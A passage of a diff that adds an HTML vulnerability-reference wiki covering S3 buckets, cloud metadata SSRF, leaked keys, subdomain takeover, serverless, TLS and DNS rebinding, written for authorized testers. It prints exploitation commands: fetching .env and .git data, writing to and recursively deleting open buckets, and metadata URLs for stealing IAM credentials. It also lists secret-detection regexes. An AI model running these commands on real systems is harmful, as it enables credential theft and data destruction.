+<li><strong>.git/config</strong> — If accessible, entire source code may be downloadable via git-dumper</li>
+<li><strong>.env files</strong> — Database passwords, API keys, secret tokens</li>
+<li><strong>Error pages</strong> — Stack traces reveal internal paths, library versions, database types</li>
+<li><strong>Server headers</strong> — X-Powered-By, Server headers reveal technology stack</li>
+<li><strong>Source code comments</strong> — Developer notes, TODO items, internal URLs</li>
+</ul>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code># Download exposed .git repository
+git-dumper https://target.com/.git/ ./dumped-repo
+
+# Extract .env files
+curl -s https://target.com/.env
+
+# Parse robots.txt for hidden paths
+curl -s https://target.com/robots.txt | grep Disallow
+
+# Check source code comments
+# View page source → search for &lt;!-- -->, TODO, FIXME, password, key</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 21: MISSING HEADERS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="headers" data-search="missing security headers csp x-frame-options hsts x-content-type x-xss-protection">
+<div class="vuln-id">CWE-693 · CVSS 5.3 Medium</div>
+<h2 class="section-heading">21. Missing Security Headers</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-693: Protection Mechanism Failure</td></tr>
+<tr><td>Severity</td><td><span class="severity-medium">MEDIUM</span></td></tr>
+<tr><td>Impact</td><td>Facilitates other attacks (XSS, clickjacking, MITM, MIME sniffing)</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>HTTP security headers instruct browsers how to handle content. Missing headers don't directly expose data, but they remove protections against other attack classes.</p>
+
+<h3 class="sub-heading">Headers to Check</h3>
+<pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=()
+X-XSS-Protection: 1; mode=block  (deprecated but still useful)
+Cross-Origin-Embedder-Policy: require-corp
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin</code></pre>
+
+<h3 class="sub-heading">How to Check</h3>
+<pre><code># Check all headers
+curl -sI https://target.com | grep -iE "content-security|x-frame|x-content|hsts|referrer|permissions"
+
+# Online tools
+# securityheaders.com
+#observatory.mozilla.org</code></pre>
+</div>
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 22: S3 BUCKETS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="s3bucket" data-search="s3 bucket aws amazon cloud storage open exposed public data leak">
+<div class="vuln-id">CWE-538 · CVSS 7.5 High → 9.8 Critical</div>
+<h2 class="section-heading">22. Open S3 Buckets</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span> – <span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Data breach, source code exposure, credential theft, website defacement</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Amazon S3 (Simple Storage Service) is a cloud object storage service. Misconfigured bucket permissions can expose sensitive data to the public internet, or worse, allow unauthenticated write access enabling data modification or deletion.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>JavaScript source</strong> — Search page source for "s3.amazonaws.com", "s3://"</li>
+<li><strong>Google dorks</strong> — <code>site:s3.amazonaws.com "company-name"</code></li>
+<li><strong>GitHub search</strong> — Search for S3 URLs in public code</li>
+<li><strong>Tools</strong> — S3Scanner, bucket-finder, GrayhatWarfare</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code># List bucket contents
+aws s3 ls s3://BUCKET-NAME --no-sign-request
+
+# Download files
+aws s3 cp s3://BUCKET-NAME/file.txt . --no-sign-request
+
+# Test write access (CRITICAL finding)
+echo "test" > test.txt
+aws s3 cp test.txt s3://BUCKET-NAME/test.txt --no-sign-request
+
+# Delete all files (NEVER do this on unauthorized targets)
+aws s3 rm s3://BUCKET-NAME --recursive --no-sign-request</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 23: CLOUD METADATA -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="metadata" data-search="cloud metadata aws gcp azure 169.254.169.254 iam credentials ssrf imds">
+<div class="vuln-id">CWE-668 · CVSS 9.1 Critical</div>
+<h2 class="section-heading">23. Cloud Metadata Exploitation</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-668: Exposure of Resource to Wrong Sphere</td></tr>
+<tr><td>Severity</td><td><span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Cloud account takeover, full infrastructure compromise, data breach</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Cloud instances (AWS EC2, GCP Compute, Azure VM) expose a metadata service at <code>169.254.169.254</code> that provides instance information and temporary credentials. Combined with SSRF, this allows attackers to steal IAM credentials and access the entire cloud infrastructure.</p>
+
+<h3 class="sub-heading">Metadata URLs</h3>
+<pre><code># AWS Metadata (IMDSv1)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/user-data/
+
+# GCP Metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+# Requires header: Metadata-Flavor: Google
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Requires header: Metadata: true</code></pre>
+
+<h3 class="sub-heading">Exploitation Chain</h3>
+<ol>
+<li><strong>Find SSRF</strong> — Discover a server-side request forgery vulnerability</li>
+<li><strong>Access metadata</strong> — Use SSRF to request <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+<li><strong>Extract credentials</strong> — Get AccessKeyId, SecretAccessKey, Token</li>
+<li><strong>Use credentials</strong> — Configure AWS CLI with stolen credentials</li>
+<li><strong>Enumerate access</strong> — <code>aws sts get-caller-identity</code>, <code>aws s3 ls</code>, <code>aws iam list-attached-user-policies</code></li>
+</ol>
+
+<div class="danger-box"><strong>⚠️ IMDSv2:</strong> AWS now recommends IMDSv2 which requires a PUT request with a token header, making SSRF exploitation harder but not impossible. Test both versions.</div>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 24: API KEY LEAKS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="apileak" data-search="api key leak exposed credentials github secret token aws gcp azure">
+<div class="vuln-id">CWE-798 · CVSS 7.5 High</div>
+<h2 class="section-heading">24. Exposed API Keys and Credentials</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-798: Use of Hard-coded Credentials</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Unauthorized access to cloud services, databases, third-party APIs</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>API keys, tokens, and credentials hardcoded into client-side code, source repositories, or configuration files can be extracted by attackers and used to access backend services, cloud infrastructure, and third-party APIs.</p>
+
+<h3 class="sub-heading">Key Prefixes to Search</h3>
+<pre><code># AWS
+AKIA[0-9A-Z]{16}
+
+# GCP
+AIza[0-9A-Za-z_-]{35}
+
+# Azure
+DefaultEndpointsProtocol=https;AccountName=...
+
+# GitHub Personal Access Token
+ghp_[A-Za-z0-9]{36}
+
+# Slack
+xox[baprs]-[A-Za-z0-9-]+
+
+# Stripe
+sk_live_[0-9a-zA-Z]{24,}
+rk_live_[0-9a-zA-Z]{24,}
+
+# Private Keys
+-----BEGIN RSA PRIVATE KEY-----
+-----BEGIN OPENSSH PRIVATE KEY-----</code></pre>
+
+<h3 class="sub-heading">Where to Search</h3>
+<ul>
+<li><strong>JavaScript files</strong> — View page source, search for key patterns</li>
+<li><strong>GitHub</strong> — Search for key prefixes in public repositories</li>
+<li><strong>Wayback Machine</strong> — Historical pages may contain exposed keys</li>
+<li><strong>Mobile apps</strong> — Decompile APK/IPA, search strings</li>
+<li><strong>Configuration files</strong> — /.env, /config.js, /settings.json</li>
+</ul>
+
+<div class="danger-box"><strong>⚠️ NEVER use found credentials</strong> — Document and report them. Using unauthorized credentials is a criminal offense.</div>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 25: SUBDOMAIN TAKEOVER -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="takeover" data-search="subdomain takeover dangling cname heroku azure s3 cloudfront github pages">
+<div class="vuln-id">CWE-440 · CVSS 7.5 High</div>
+<h2 class="section-heading">25. Subdomain Takeover</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-440: Intended Operation Reversal</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Phishing, session hijacking, XSS on trusted domain, brand impersonation</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Subdomain takeover occurs when a DNS record (CNAME) points to a cloud service (Heroku, Azure, S3, CloudFront) that has been deprovisioned but the DNS record remains. An attacker claims the resource and serves content on the victim's subdomain.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Enumerate subdomains</strong> — crt.sh, subfinder, amass, Sublist3r</li>
+<li><strong>Check CNAME records</strong> — <code>dig subdomain.target.com CNAME</code></li>
+<li><strong>Identify unclaimed resources</strong> — If CNAME points to Heroku/Azure/S3 and the resource returns "No such app" or 404</li>
+<li><strong>Verify with tools</strong> — subjack, can-i-take-over-xyz</li>
+</ol>
+
+<h3 class="sub-heading">Vulnerable Services</h3>
+<pre><code>*.amazonaws.com     → S3 bucket or CloudFront
+*.herokuapp.com     → Heroku app
+*.azurewebsites.net → Azure app service
+*.cloudapp.net      → Azure cloud service
+*.cloudfront.net    → CloudFront distribution
+*.github.io         → GitHub Pages
+*.surge.sh          → Surge hosting
+*.shopify.com       → Shopify store
+*.ghost.io          → Ghost blog
+*.pantheon.io       → Pantheon hosting
+*.feedpress.com     → FeedPress</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 26: LAMBDA -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="lambda" data-search="lambda serverless aws azure functions gcp cloud functions env vars iam role">
+<div class="vuln-id">CWE-284 · CVSS 8.1 High</div>
+<h2 class="section-heading">26. Lambda / Serverless Vulnerabilities</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-284: Improper Access Control</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span> – <span class="severity-critical">CRITICAL</span></td></tr>
+<tr><td>Impact</td><td>Secret exposure, lateral movement, data breach, infrastructure compromise</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Serverless functions (AWS Lambda, Azure Functions, GCP Cloud Functions) store secrets in environment variables, execute with IAM roles, and may be accessible via public URLs. Vulnerabilities include exposed env vars, overprivileged roles, and injection flaws in function code.</p>
+
+<h3 class="sub-heading">What to Test</h3>
+<pre><code># If you get code execution in a Lambda:
+import os
+print(os.environ)  # Dump all environment variables
+
+# Check IAM role identity:
+import boto3
+sts = boto3.client('sts')
+print(sts.get_caller_identity())
+
+# Check accessible resources:
+# Can it read S3 buckets?
+# Can it access DynamoDB tables?
+# Can it invoke other Lambda functions?
+# Can it access RDS databases?
+
+# Test function URLs for:
+# SQL injection, command injection, IDOR
+# Missing authentication
+# Path traversal
+# SSRF from within the function</code></pre>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 27: SSL/TLS -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="ssl" data-search="ssl tls certificate weak cipher heartbleed beast poodle downgrade">
+<div class="vuln-id">CWE-326 · CVSS 7.4 High</div>
+<h2 class="section-heading">27. SSL/TLS Vulnerabilities</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-326: Inadequate Encryption Strength</td></tr>
+<tr><td>Severity</td><td><span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Man-in-the-middle attacks, data interception, credential theft</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>Weak SSL/TLS configurations allow attackers to intercept, decrypt, or manipulate encrypted traffic. This includes support for outdated protocols (SSLv3, TLS 1.0/1.1), weak cipher suites, certificate validation errors, and known vulnerabilities like Heartbleed.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<pre><code># Test SSL configuration
+nmap --script ssl-enum-ciphers -p 443 target.com
+
+# Check for specific vulnerabilities
+sslscan target.com
+testssl.sh target.com
+
+# Online tools
+# ssllabs.com/ssltest
+# cryptoobservatory.com</code></pre>
+
+<h3 class="sub-heading">What to Look For</h3>
+<ul>
+<li><strong>Outdated protocols</strong> — SSLv3, TLS 1.0, TLS 1.1 should be disabled</li>
+<li><strong>Weak ciphers</strong> — RC4, DES, 3DES, export-grade ciphers</li>
+<li><strong>Certificate issues</strong> — Self-signed, expired, wrong domain, incomplete chain</li>
+<li><strong>Heartbleed (CVE-2014-0160)</strong> — OpenSSL memory leak</li>
+<li><strong>POODLE (CVE-2014-3566)</strong> — SSLv3 downgrade attack</li>
+<li><strong>Missing HSTS</strong> — No Strict-Transport-Security header</li>
+</ul>
+</div>
+
+<!-- ███████████████████████████████████████████████████████████████ -->
+<!-- VULNERABILITY 28: DNS REBINDING -->
+<!-- ███████████████████████████████████████████████████████████████ -->
+<div class="vuln-section" id="dns" data-search="dns rebinding rebinding attack local network internal ip router">
+<div class="vuln-id">CWE-346 · CVSS 6.5 Medium → 8.1 High</div>
+<h2 class="section-heading">28. DNS Rebinding</h2>
+
+<table class="wiki-table">
+<tr><th>Attribute</th><th>Value</th></tr>
+<tr><td>CWE</td><td>CWE-346: Origin Validation Error</td></tr>
+<tr><td>Severity</td><td><span class="severity-medium">MEDIUM</span> – <span class="severity-high">HIGH</span></td></tr>
+<tr><td>Impact</td><td>Bypass same-origin policy, access internal services, router admin panels</td></tr>
+</table>
+
+<h3 class="sub-heading">Description</h3>
+<p>DNS rebinding tricks a browser into making requests to internal network addresses by rapidly changing the DNS resolution of a malicious domain. The attacker's domain first resolves to a public IP (bypassing initial checks), then rebinds to 127.0.0.1 or an internal IP. The browser thinks it's making a same-origin request to the attacker's domain, but it's actually hitting internal services.</p>
+
+<h3 class="sub-heading">How to Find</h3>
+<ol>
+<li><strong>Test internal access</strong> — Find an application that makes requests to user-supplied URLs</li>
+<li><strong>Set up rebinding server</strong> — Use rbndr.us or custom DNS server</li>
+<li><strong>Bypass DNS pinning</strong> — Use very low TTL values</li>
+<li><strong>Exploit router admin panels</strong> — Access 192.168.1.1, 10.0.0.1, etc.</li>
+</ol>
+
+<h3 class="sub-heading">Exploitation</h3>
+<pre><code># Use rbndr.us for quick testing
+# Generate rebinding domain:
+# https://rbndr.us/rebind?hostname=attacker.com&ttl=1
+
+# First request: resolves to attacker.com (public)
+# Second request (within TTL): resolves to 127.0.0.1
+
+# Exploit chain:
+1. Victim visits attacker.com
+2. DNS resolves to attacker's server (public IP)
+3. JavaScript on page makes fetch() to attacker.com
+4. DNS rebinds to 127.0.0.1
+5. fetch() now hits localhost on victim's machine
+6. Attacker reads response (internal service data)</code></pre>
+
+<h3 class="sub-heading">Remediation</h3>
+<ul>
+<li><strong>DNS pinning</strong> — Browsers should pin DNS resolutions</li>
+<li><strong>Validate Host header</strong> — Server should validate the Host header matches expected values</li>
+<li><strong>Use IP-based access controls</strong> — Don't rely solely on DNS for security</li>
+</ul>
+</div>
+
+<!-- FOOTER -->
+<div class="wiki-footer" style="margin-top:40px">
+<p><strong>Vulnerability Database</strong> · Last updated: 2025</p>
+<p>Content available under Creative Commons Attribution-ShareAlike License</p>
+<p style="margin-top:8px">Only test on authorized targets. Stay legal. 🧭</p>
+<p style="margin-top:4px;font-size:.78em">References: OWASP Top 10 (2021) · CWE/SANS Top 25 · HackerOne Hacktivity · PortSwigger Web Security Academy</p>
+</div>
+
+</div><!-- end wiki-content -->
+</div><!-- end wiki-layout -->
+
+<script>
+function filterVulns(){
+  var q=document.getElementById('searchInput').value.toLowerCase();
+  document.querySelectorAll('.vuln-section').forEach(function(s){
+    var t=(s.dataset.search||'')+' '+(s.textContent||'');
+    s.style.display=t.toLowerCase().indexOf(q)===-1?'none':'';
+  });
+}
+</script>
+</body>
+</html>
